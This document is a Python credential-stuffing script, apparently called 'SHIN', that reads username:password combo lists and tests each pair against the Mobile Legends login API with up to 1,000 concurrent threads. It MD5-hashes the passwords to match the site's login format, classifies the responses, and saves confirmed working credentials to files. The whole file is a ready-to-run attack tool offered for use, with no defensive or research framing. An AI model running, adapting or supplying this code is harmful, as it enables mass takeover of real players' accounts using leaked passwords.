import httpx
import hashlib
import json
import time
from rich.console import Console
from rich.text import Text
import pyfiglet
from concurrent.futures import ThreadPoolExecutor, as_completed
import sys
from threading import Lock

# Initialize console for rich output
console = Console()

# Thread-safe counters
lock = Lock()
stats = {
    "success": 0,
    "incorrect_password": 0,
    "no_account": 0,
    "invalid_format": 0,
    "errors": 0
}

def hash_md5(text: str) -> str:
    """Returns the MD5 hash of the given text."""
    return hashlib.md5(text.encode('utf-8')).hexdigest()

def print_banner():
    """Prints the ASCII banner for the account checker tool."""
    ascii_banner = pyfiglet.figlet_format("SHIN", font="slant")
    console.print(f"[bold cyan]{ascii_banner}[/bold cyan]")
    console.print(Text("       Developed by: shin", style="bold yellow"))

def load_file():
    """Loads the input file and returns the lines."""
    while True:
        try:
            filename = input('[?] Enter filename: ')
            if not filename.strip():
                console.print("[bold red]Error: No file name provided! Please try again.[/bold red]")
                continue
            with open(filename, 'r') as file:
                lines = file.readlines()
            if not lines:
                console.print("[bold red]Error: The file is empty![/bold red]")
                continue
            return lines
        except FileNotFoundError:
            console.print("[bold red]Error: File not found![/bold red]")
        except KeyboardInterrupt:
            console.print("\n[bold yellow]Operation cancelled by user. Exiting...[/bold yellow]")
            sys.exit(0)
            
def save_progress(valid_accounts, error_accounts, final_save=False):
    """Saves the progress to files."""
    mode = 'w' if final_save else 'a'  # Append mode for autosave, write mode for final save
    timestamp = time.strftime("%Y-%m-%d_%H-%M-%S") if final_save else ""

    valid_file = f"valid-accounts{'_' + timestamp if final_save else ''}.txt"
    error_file = f"error-accounts{'_' + timestamp if final_save else ''}.txt"

    with open(valid_file, mode) as valid_out:
        valid_out.write("\n".join(valid_accounts) + "\n")

    with open(error_file, mode) as error_out:
        error_out.write("\n".join(error_accounts) + "\n")

    if final_save:
        console.print("[bold cyan]Final results saved.[/bold cyan]")

def check_account(client, line):
    """Checks a single account."""
    line = line.strip()
    if not line or ':' not in line:
        with lock:
            stats["invalid_format"] += 1
        return None, f"[bold yellow][INVALID] Invalid format: {line}[/bold yellow]"

    try:
        username, password = line.split(':', 1)
    except ValueError:
        with lock:
            stats["invalid_format"] += 1
        return None, f"[bold yellow][INVALID] Invalid format: {line}[/bold yellow]"

    md5_password = hash_md5(password.strip())
    data = {
        'account': username.strip(),
        'md5pwd': md5_password,
        'module': 'mpass',
        'type': 'web',
        'app_id': '668'
    }

    try:
        response = client.post('https://sg-api.mobilelegends.com/base/login', data=data)
        res = response.json()
        msg = res.get('msg')

        with lock:
            if msg == "ok":
                stats["success"] += 1
                return f"{username.strip()}:{password.strip()}", f"[SUCCESS] Valid: {username.strip()}"
            elif msg == "Error_PasswdError":
                stats["incorrect_password"] += 1
                return None, f"[FAILED] Incorrect password for {username.strip()}"
            elif msg == "Error_NoAccount":
                stats["no_account"] += 1
                return None, f"[FAILED] Account not found: {username.strip()}"
            else:
                stats["errors"] += 1
                return None, f"[ERROR] Unknown response for {username.strip()}"
    except Exception as e:
        with lock:
            stats["errors"] += 1
        return None, f"[ERROR] Exception for {username.strip()}: {e}"

def main():
    print_banner()
    console.print('[bold yellow][!] We accept User:Pass, Email:Pass, or Login:Pass[/bold yellow]')
    lines = load_file()
    total_accounts = len(lines)

    console.print(f"[bold cyan]Starting check for {total_accounts} accounts...[/bold cyan]")
    successful_creds = []
    error_logs = []

    autosave_interval = 500

    with httpx.Client(timeout=20) as client:
        with ThreadPoolExecutor(max_workers=1000) as executor:
            futures = {executor.submit(check_account, client, line): line for line in lines}
            for count, future in enumerate(as_completed(futures), start=1):
                result, log = future.result()
                console.print(log)
                if result:
                    successful_creds.append(result)
                else:
                    error_logs.append(log)

                if count % autosave_interval == 0:
                    save_progress(successful_creds, error_logs)
                    console.print(f"[bold cyan]Autosaved progress at {count}/{total_accounts} accounts.[/bold cyan]")

    save_progress(successful_creds, error_logs, final_save=True)

    console.print("\n[bold cyan]Final Summary[/bold cyan]")
    console.print(f"[bold white]Total Accounts Checked: {total_accounts}[/bold white]")
    console.print(f"[bold green]Valid Accounts: {stats['success']}[/bold green]")
    console.print(f"[bold red]Incorrect Passwords: {stats['incorrect_password']}[/bold red]")
    console.print(f"[bold yellow]Invalid Formats: {stats['invalid_format']}[/bold yellow]")
    console.print(f"[bold black on yellow]Nonexistent Accounts: {stats['no_account']}[/bold black on yellow]")
    console.print(f"[bold gray]Errors: {stats['errors']}[/bold gray]")

if __name__ == "__main__":
    main()